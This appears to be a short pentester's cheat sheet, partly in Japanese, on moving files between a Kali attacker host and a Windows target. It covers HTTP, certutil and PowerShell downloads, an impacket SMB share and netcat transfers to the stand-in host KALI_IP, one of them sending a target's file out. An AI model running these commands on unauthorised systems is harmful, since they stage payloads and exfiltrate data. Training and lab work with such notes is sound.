## SCP

## HTTP

apache web server  

python web server  
カレントディレクトリのファイルをリモート側でダウンロードさせる  
```
python3 -m http.server
```

download command  
powershell
```
iwr -Uri "URL" -OutFile "保存先のファイルパス"
```

cmd prompt
```
certutil -urlcache -split -f URL OUTPUTFILE
```
## SMB
server (linux)
```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```

client (windows)
```
net use m: \\KALI_IP\test /user:kourosh kourosh
```

# Netcat
### kali -> windows
listener (linux)
```
nc -nvlp 9999 < file.txt
```

client (windows)
```
C:\Tools\nc.exe -nv KALI_IP 9999 > file.txt
```

### windows -> kali
listener (kali)
```
nc -nvlp 9999 > file.txt
```

client (windows)
```
nc.exe -nv KALI_IP 9999 < file.txt
```